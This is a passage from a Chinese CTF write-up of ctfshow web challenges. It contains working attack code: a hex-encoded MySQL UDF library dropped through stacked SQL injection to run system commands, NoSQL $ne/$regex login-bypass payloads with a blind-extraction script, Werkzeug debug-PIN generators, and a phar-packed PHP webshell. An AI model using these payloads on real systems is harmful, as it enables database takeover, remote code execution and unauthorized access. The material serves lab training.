6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&quot;
for i in range(0,21510, 5000):
    end &#x3D; i + 5000
    payload.append(udf[i:end])

p &#x3D; dict(zip(text, payload))

for t in text:
    url &#x3D; base_url+&quot;?id&#x3D;&#39;;select unhex(&#39;&#123;&#125;&#39;) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#123;&#125;.txt&#39;--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;.format(p[t], t)
    r &#x3D; requests.get(url)
    print(r.status_code)

next_url &#x3D; base_url+&quot;?id&#x3D;&#39;;select concat(load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;a.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;b.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;c.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;d.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;e.txt&#39;)) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;udf.so&#39;--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;
rn &#x3D; requests.get(next_url)

uaf_url&#x3D;base_url+&quot;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+&quot;#导入udf函数
r&#x3D;requests.get(uaf_url)
nn_url &#x3D; base_url+&quot;?id&#x3D;&#39;;select sys_eval(&#39;cat &#x2F;flag.*&#39;);--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;
rnn &#x3D; requests.get(nn_url)
print(rnn.text)
</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512180600048.png" alt="image-20220512180600048"></p>
<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>sql语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无
$user &#x3D; $memcache-&gt;get($id);
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤</code></pre>

<p>nosql的注入</p>
<p><a target="_blank" rel="noopener" href="http://rui0.cn/archives/609">NoSQL注入小笔记 - Ruilin (rui0.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/97211#h2-0">https://www.anquanke.com/post/id/97211#h2-0</a></p>
<blockquote>
<h4 id="NoSQL相关的SQL攻击"><a href="#NoSQL相关的SQL攻击" class="headerlink" title="NoSQL相关的SQL攻击:"></a>NoSQL相关的SQL攻击:</h4><p>1.<strong>重言式</strong>。又称为永真式。此类攻击是在条件语句中注入代码,使生成的表达式判定结果永远为真,从而绕过认证或访问机制。比如实际中用$ne操作(不相等)的语法让他们无需相应的凭证即可非法进入系统。</p>
<p>2.<strong>联合查询</strong>。联合查询是一种众所周知的SQL注入技术,攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。比如通过增加永真的表达式利用布尔OR运算符进行攻击,从而导致整个语句判定出错,进行非法的数据获取。</p>
<p>3.<strong>JavaScript注入</strong>。这是一种新的漏洞,由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码,这会导致非法的数据获取或篡改。</p>
<p>4.<strong>背负式查询</strong>。在背负式查询中,攻击者通过利用转义特定字符(比如像回车和换行之类的结束符)插入由数据库额外执行的查询,这样就可以执行任意代码了。</p>
<p>5.<strong>跨域违规</strong>。HTTP REST APIs是NoSQL数据库中的一个流行模块,然而,它们引入了一类新的漏洞,它甚至能让攻击者从其他域攻击数据库。在跨域攻击中,攻击者利用合法用户和他们的网页浏览器执行有害的操作。在本文中,我们将展示此类跨站请求伪造(CSRF)攻击形式的违规行为,在此网站信任的用户浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站上,攻击者可以在目标数据库上执行post动作,从而破坏数据库。</p>
<h4 id="NoSQL-MYSQL区别："><a href="#NoSQL-MYSQL区别：" class="headerlink" title="NoSQL MYSQL区别："></a>NoSQL MYSQL区别：</h4><p>nosql的定义是not only sql，包括键值数据库，列式数据库，文本数据库，图形数据库等</p>
<p>mysql是一种传统的关系型数据库。 关系型数据库一般都可以通过sql语句进行操作。sql的语法一般遵循SQL99标准，也就是说上层的应用可以通过同样的sql语句访问不同的数据库。 而nosql对sql的支持并不像关系型数据库一样。以hbase为例，它本身并不支持sql，我们可以通过hbase shell进行操作，上层应用可以通过hbase API读写数据库。但是我们也可以通过hive（hive sql，类sql语法）来访问hbase。还有一些hbase skin（可以理解成hbase客户端），支持了部分sql语法以方便用户使用，比如pheonix。</p>
</blockquote>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512181741192.png" alt="image-20220512181741192"></p>
<p>所以payload为</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">?id[]&#x3D;flag</code></pre>

<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><p>sql语句</p>
<pre class="language-none"><code class="language-none">$query &#x3D; new MongoDB\Driver\Query($data);
$cursor &#x3D; $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray();
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤
if(count($cursor)&gt;0)&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
  array_push($ret[&#39;data&#39;], $flag);
&#125;</code></pre>

<p>还是nosql注入</p>
<p>条件操作符</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">$gt : &gt;
$lt : &lt;
$gte: &gt;&#x3D;
$lte: &lt;&#x3D;
$ne : !&#x3D;、&lt;&gt;
$in : in
$nin: not in
$all: all 
$or:  or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)
&#x2F;**
* : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;
* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;
* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;
*&#x2F;
</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512185557335.png" alt="image-20220512185557335"></p>
<pre class="language-php" data-language="php"><code class="language-php">db-&gt;logins-&gt;find(  array(&quot;username&quot;&#x3D;&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;&#x3D;&gt;(string)$_    POST[&quot;password&quot;]));</code></pre>

<p>构造<code>$data = array(“username” =&gt; array(&quot;$ne&quot; =&gt; 1), “password” =&gt; array(&quot;$ne&quot; =&gt; 1));</code>进行绕过</p>
<p>还是之前那个文章里面写到的($ne是不相等的意思)</p>
<pre class="language-payload" data-language="payload"><code class="language-payload">username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1
或者利用正则
username[$regex]&#x3D;.&amp;password[$regex]&#x3D;.</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512190339907.png" alt="image-20220512190339907"></p>
<h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><p>用上一题的姿势，出了admin账号的用户名密码：<br>再改成username不等于admin即可：</p>
<pre class="language-none"><code class="language-none">username[$ne]&#x3D;admin&amp;password[$ne]&#x3D;1</code></pre>

<h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><p>直接正则：</p>
<pre class="language-none"><code class="language-none">username[$regex]&#x3D;.*$&amp;password[$ne]&#x3D;1</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512185920690.png" alt="image-20220512185920690"></p>
<p>这里登录测试，还会发现有admin和admin1，可以用这种正则去掉这俩</p>
<pre class="language-payload" data-language="payload"><code class="language-payload">username[$regex]&#x3D;^[^admin].*$&amp;password[$ne]&#x3D;1</code></pre>

<h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>sql语句</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;sql
db.ctfshow_user.find(&#123;username:&#39;$username&#39;,password:&#39;$password&#39;&#125;).pretty()
    </code></pre>

<p>返回逻辑</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;无过滤
if(count($cursor)&gt;0)&#123;
  $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
  array_push($ret[&#39;data&#39;], $flag);
&#125;  </code></pre>

<p>继续<code>$regex</code>但发现状态码是<code>\u767b\u9646\u6210\u529f</code>，是查询成功的Unicode编码，但就是没有回显。所以这题结合这个状态码进行盲注</p>
<p>套神的脚本</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
url&#x3D;&quot;http:&#x2F;&#x2F;81040e32-f0ba-4e17-b9eb-56848ad36c4c.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
letter&#x3D;&quot;-ctfshow0123456789abcdef&#123;,&#125;&quot;
flag&#x3D;&quot;&quot;
for i in range(1,100):
    for j in letter:

        payload&#x3D;&quot;^&#123;&#125;.*$&quot;.format(flag+j)
        data&#x3D;&#123;
            &quot;username[$regex]&quot;:&quot;flag&quot;,
            &quot;password[$regex]&quot;:payload
        &#125;
        res&#x3D;requests.post(url,data).text
        #print(res)
        if r&quot;\u767b\u9646\u5931\u8d25&quot; not in res:
            flag+&#x3D;j
            print(flag)
            break
  
        if j&#x3D;&#x3D;&quot;&#125;&quot;:
            print(flag+&quot;--OUT&quot;)
            exit()
</code></pre>

<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><h1 id="常用姿势"><a href="#常用姿势" class="headerlink" title="常用姿势"></a>常用姿势</h1><h2 id="web801"><a href="#web801" class="headerlink" title="web801"></a>web801</h2><p>预期解：flask算pin</p>
<p>条件: flask debug模式开启 存在任意文件读取</p>
<blockquote>
<ol>
<li>username，用户名</li>
<li>modname，默认值为flask.app</li>
<li>appname，默认值为Flask</li>
<li>moddir，flask库下app.py的绝对路径</li>
<li>uuidnode，当前网络的mac地址的十进制数</li>
<li>machine_id，docker机器id<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524154547435.png" alt="image-20220524154547435"></li>
</ol>
</blockquote>
<blockquote>
<p>probably_public_bits包含4个字段，分别为<br>username<br>modname<br>getattr(app, &#39;name&#39;, app.class.name)<br>getattr(mod, &#39;file&#39;, None)</p>
<p>其中username对应的值为当前主机的用户名<br>   linux可以查看/etc/passwd<br>   windows可以查看C:/Users目录<br>modname的值为&#39;flask.app&#39;<br>getattr(app, &#39;name&#39;, app.class.name)对应的值为&#39;Flask&#39;<br>getattr(mod, &#39;file&#39;, None)对应的值为app包的绝对路径</p>
<p>private_bits包含两个字段，分别为<br>str(uuid.getnode())<br>get_machine_id()</p>
<p>其中str(uuid.getnode())为网卡mac地址的十进制值<br>   在inux系统下得到存储位置为/sys/class/net/（对应网卡）/address 一般为eth0<br>   windows中cmd执行config /all查看<br>get_machine_id()的值为当前机器唯一的机器码<br>   对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id<br>   docker机则读取/proc/self/cgroup。<br>   windows的id在注册表中 （HKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptography）</p>
</blockquote>
<p>其中</p>
<p><strong>python 3.8和3.6 pin码生成方式不同</strong></p>
<p><strong>werkzeug版本不同machine-id获取不同</strong></p>
<p>3.6 MD5</p>
<pre class="language-python" data-language="python"><code class="language-python">import hashlib
import getpass
from flask import Flask
from itertools import chain
import sys
import uuid
username&#x3D;getpass.getuser() 
app &#x3D; Flask(__name__)
modname&#x3D;getattr(app, &quot;__module__&quot;, app.__class__.__module__)
mod &#x3D; sys.modules.get(modname)

probably_public_bits &#x3D; [
    username, #用户名 一般为root或者读下&#x2F;etc&#x2F;passwd
    modname,  #一般固定为flask.app
    getattr(app, &quot;__name__&quot;, app.__class__.__name__), #固定，一般为Flask
    getattr(mod, &quot;__file__&quot;, None),    #flask库下app.py的绝对路径，可以通过报错信息得到
]
mac &#x3D;&#39;02:42:ac:0c:ac:28&#39;.replace(&#39;:&#39;,&#39;&#39;)
mac&#x3D;str(int(mac,base&#x3D;16))
private_bits &#x3D; [
	mac,
	 &quot;机器码&quot;
	 ]
h &#x3D; hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit &#x3D; bit.encode(&quot;utf-8&quot;)
    h.update(bit)
h.update(b&quot;cookiesalt&quot;)

cookie_name &#x3D; &quot;__wzd&quot; + h.hexdigest()[:20]

# If we need to generate a pin we salt it a bit more so that we don&#39;t
# end up with the same value and generate out 9 digits
num&#x3D;None
if num is None:
    h.update(b&quot;pinsalt&quot;)
    num &#x3D; (&quot;%09d&quot; % int(h.hexdigest(), 16))[:9]

# Format the pincode in groups of digits for easier remembering if
# we don&#39;t have a result yet.
rv&#x3D;None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size &#x3D;&#x3D; 0:
            rv &#x3D; &quot;-&quot;.join(
                num[x : x + group_size].rjust(group_size, &quot;0&quot;)
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv &#x3D; num
    print(rv)
</code></pre>

<p>3.8 SHA1</p>
<pre class="language-python" data-language="python"><code class="language-python">import hashlib
import getpass
from flask import Flask
from itertools import chain
import sys
import uuid
import typing as t
username&#x3D;&#39;root&#39;
app &#x3D; Flask(__name__)
modname&#x3D;getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)
mod&#x3D;sys.modules.get(modname)
mod &#x3D; getattr(mod, &quot;__file__&quot;, None)

probably_public_bits &#x3D; [
    username, #用户名
    modname,  #一般固定为flask.app
    getattr(app, &quot;__name__&quot;, app.__class__.__name__), #固定，一般为Flask
    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39;,   #主程序（app.py）运行的绝对路径
]
print(probably_public_bits)
mac &#x3D;&#39;02:42:ac:0c:ac:28&#39;.replace(&#39;:&#39;,&#39;&#39;)
mac&#x3D;str(int(mac,base&#x3D;16))
private_bits &#x3D; [
   mac,#mac地址十进制
 &quot;机器码&quot;
     ]
print(private_bits)
h &#x3D; hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit &#x3D; bit.encode(&quot;utf-8&quot;)
    h.update(bit)
h.update(b&quot;cookiesalt&quot;)

cookie_name &#x3D; f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;

# If we need to generate a pin we salt it a bit more so that we don&#39;t
# end up with the same value and generate out 9 digits
h.update(b&quot;pinsalt&quot;)
num &#x3D; f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]

# Format the pincode in groups of digits for easier remembering if
# we don&#39;t have a result yet.
rv&#x3D;None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size &#x3D;&#x3D; 0:
            rv &#x3D; &quot;-&quot;.join(
                num[x : x + group_size].rjust(group_size, &quot;0&quot;)
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv &#x3D; num

print(rv)
</code></pre>

<p><strong>需要填的值就一个变化的地方—机器码。旧版的只需要读取/proc/self/cgroup即可，但是新增需要在前面再拼上/etc/machine-id或者/proc/sys/kernel/random/boot_id的值</strong></p>
<p>旧版</p>
<pre class="language-none"><code class="language-none">先从&#x2F;proc&#x2F;self&#x2F;cgroup判断是否是docker容器，如果有符合条件的值直接返回value；如果未在cgroup中读到&#x2F;docker&#x2F;后的内容
进行下一步，先后读取&#x2F;etc&#x2F;machine-id 和 boot_id中的值返回一个

所以此处machine-id应为
docker: cgroup中 &#x2F;docker&#x2F;后的内容
非docker: 先后读取machine-id和boot_id 有值即取</code></pre>

<p>新版</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">先从&#x2F;etc&#x2F;machine-id和&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id读出一个就跳出，然后再读取&#x2F;proc&#x2F;self&#x2F;cgroup中的id值拼接
所以此处machine-id为
&#x2F;etc&#x2F;machine-id + &#x2F;proc&#x2F;self&#x2F;cgroup
或
&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id + &#x2F;proc&#x2F;self&#x2F;cgroup</code></pre>

<p>实操一下801</p>
<p>username</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524154520223.png" alt="image-20220524154520223"></p>
<p>路径</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155654602.png" alt="image-20220524155654602"></p>
<p>mac地址</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155323058.png" alt="image-20220524155323058"></p>
<p>再拿id</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155416263.png" alt="image-20220524155416263"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155504261.png" alt="image-20220524155504261"></p>
<p>所以最后的机器码为8fa8946d-c588-40d0-9458-c3e9cf0a8851c292988f5c1a7a742186319fd5bb28c02167bce3e99959638562210c1ecf54ad</p>
<p>带脚本里跑出值然后访问console</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155757898.png" alt="image-20220524155757898"></p>
<p>引入os库来得到flag</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155954645.png" alt="image-20220524155954645"></p>
<h2 id="web802"><a href="#web802" class="headerlink" title="web802"></a>web802</h2><p>无数字字母命令执行</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

error_reporting(0);
highlight_file(__FILE__);
$cmd &#x3D; $_POST[&#39;cmd&#39;];

if(!preg_match(&#39;&#x2F;[a-z]|[0-9]&#x2F;i&#39;,$cmd))&#123;
    eval($cmd);
&#125;</code></pre>

<p>这里显然就算利用异或，非，取反来构造命令进行命令执行</p>
<p>直接上羽师傅的脚本</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524160514067.png" alt="image-20220524160514067"></p>
<h2 id="web803"><a href="#web803" class="headerlink" title="web803"></a>web803</h2><p>phar文件包含</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https:&#x2F;&#x2F;ctfer.com


error_reporting(0);
highlight_file(__FILE__);
$file &#x3D; $_POST[&#39;file&#39;];
$content &#x3D; $_POST[&#39;content&#39;];

if(isset($content) &amp;&amp; !preg_match(&#39;&#x2F;php|data|ftp&#x2F;i&#39;,$file))&#123;
    if(file_exists($file.&#39;.txt&#39;))&#123;
        include $file.&#39;.txt&#39;;
    &#125;else&#123;
        file_put_contents($file,$content);
    &#125;
&#125;</code></pre>

<p>在文件后加上了.phar后缀，这里直接把马写在phar里就行了</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
   
    $phar &#x3D; new Phar(&quot;includephar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar
   
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;); &#x2F;&#x2F;设置stub
    
     
    $phar-&gt;addFromString(&#39;test.txt&#39;, &#39;&lt;?php system($_POST[a]);?&gt;&#39;); &#x2F;&#x2F;
    $phar-&gt;stopBuffering();
    &#x2F;&#x2F; phar生成

?&gt;</code></pre>

<p>没权限写的时候就往tmp目录底下写</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524162306332.png" alt="image-20220524162306332"></p>
<p>然后用phar协议来访问</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524162356068.png" alt="image-20220524162356068"></p>
<h2 id="web804"><a href="#web804" class="headerlink" title="web804"></a>web804</h2><p>phar反序列化，考烂了快</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);

class hacker&#123;
    public $code;
    public function __destruct()&#123;
        eval($this-&gt;code);
    &#125;
&#125;

$file &#x3D; $_POST[&#39;file&#39;];
$content &#x3D; $_POST[&#39;content&#39;];

if(isset($content) &amp;&amp; !preg_match(&#39;&#x2F;php|data|ftp&#x2F;i&#39;,$file))&#123;
    if(file_exists($file))&#123;
        unlink($file);
    &#125;else&#123;
        file_put_contents($file,$content);
    &#125;
&#125;</code></pre>

<p>构造链子</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524164057529.png" alt="image-20220524164057529"></p>
<p>传上去之后phar访问一下</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524164042957.png" alt="image-20220524164042957"></p>
<h2 id="web805"><a href="#web805" class="headerlink" title="web805"></a>web805</h2><p><strong>open_basedir绕过</strong></p>
